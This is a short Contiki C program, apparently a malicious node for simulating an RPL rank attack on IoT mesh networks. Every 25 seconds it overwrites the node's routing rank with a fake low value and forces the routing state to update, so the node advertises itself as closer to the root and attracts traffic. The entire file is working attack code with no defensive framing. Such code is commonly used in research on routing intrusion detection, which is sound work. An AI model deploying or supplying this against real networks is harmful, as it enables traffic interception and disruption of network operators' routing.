#include "contiki.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-dag.h"
#include <stdio.h>

PROCESS(rank_attack_process, "Rank Attack");
AUTOSTART_PROCESSES(&rank_attack_process);

PROCESS_THREAD(rank_attack_process, ev, data)
{
  static struct etimer timer;
  PROCESS_BEGIN();

  printf("Rank Attack Started on Mote %u\n",
         (unsigned)linkaddr_node_addr.u8[0]);

  etimer_set(&timer, CLOCK_SECOND * 25);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

    rpl_dag_t *dag = rpl_get_any_dag();
    if(dag != NULL) {

      rpl_rank_t fake_rank = 128;

      printf("Rank Attack: Mote %u advertising fake rank %u\n",
             (unsigned)linkaddr_node_addr.u8[0], fake_rank);

      dag->rank = fake_rank;

      rpl_dag_update_state();

      rpl_timers_schedule_state_update();    }

    etimer_reset(&timer);
  }

  PROCESS_END();
}

